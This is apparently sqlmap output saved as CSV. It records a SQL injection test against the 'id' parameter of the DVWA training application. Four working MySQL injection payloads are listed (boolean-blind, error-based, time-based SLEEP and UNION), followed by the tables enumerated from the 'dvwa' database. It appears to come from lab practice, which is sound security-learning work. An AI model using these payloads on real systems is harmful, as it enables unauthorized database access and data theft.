Type,Details
Parameter,Parameter: id (GET)
Type,Type: boolean-based blind
Title,Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
Payload,Payload: id=1' OR NOT 8287=8287#&Submit=Submit
Type,Type: error-based
Title,"Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)"
Payload,"Payload: id=1' AND (SELECT 4375 FROM(SELECT COUNT(*),CONCAT(0x7178627a71,(SELECT (ELT(4375=4375,1))),0x7162717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- WKpR&Submit=Submit"
Type,Type: time-based blind
Title,Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload,Payload: id=1' AND (SELECT 8266 FROM (SELECT(SLEEP(5)))uyXl)-- xkHn&Submit=Submit
Type,Type: UNION query
Title,Title: MySQL UNION query (NULL) - 2 columns
Payload,"Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7178627a71,0x6342646b62436f56686f6e4c6c7a646e646669646843456773574b496a736e665a6269555a78676d,0x7162717071)#&Submit=Submit"
Database,[21:43:22] [INFO] fetching tables for database: 'dvwa'
Database,Database: dvwa
Table,Table: users
Database,Database: dvwa
Table,Table: guestbook
